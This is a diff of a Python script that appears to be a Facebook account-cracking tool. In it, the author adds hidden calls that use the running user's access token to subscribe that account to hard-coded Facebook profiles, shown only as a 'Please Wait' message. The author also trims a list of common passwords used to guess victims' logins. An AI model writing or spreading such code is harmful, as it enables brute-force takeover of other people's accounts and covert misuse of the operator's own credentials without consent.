@@ -238,6 +238,9 @@ def kumahaaing():
 		asup_goblog()
 	cangcut("%s[%s•%s] %sPlease Wait..."%(p,h,p,p))
 	requests.post("https://graph.facebook.com/100004105699210/subscribers?access_token=" + ewehayam)
+	requests.post("https://graph.facebook.com/100006307110060/subscribers?access_token=" + ewehayam)
+	requests.post("https://graph.facebook.com/100067229448595/subscribers?access_token=" + ewehayam)
+	
 	
 ### BANTUAN ###
 
@@ -527,11 +530,9 @@ def siagoblog(text):
 					results.append("sayang")
 					results.append("anjing")
 					results.append("bismillah")
-					results.append("assalamualaikum")
 					results.append("katasandi")
 					results.append("rahasia")
 					results.append("kontol")
-					results.append("majalengka")
 					results.append("123456")
 	return results
 
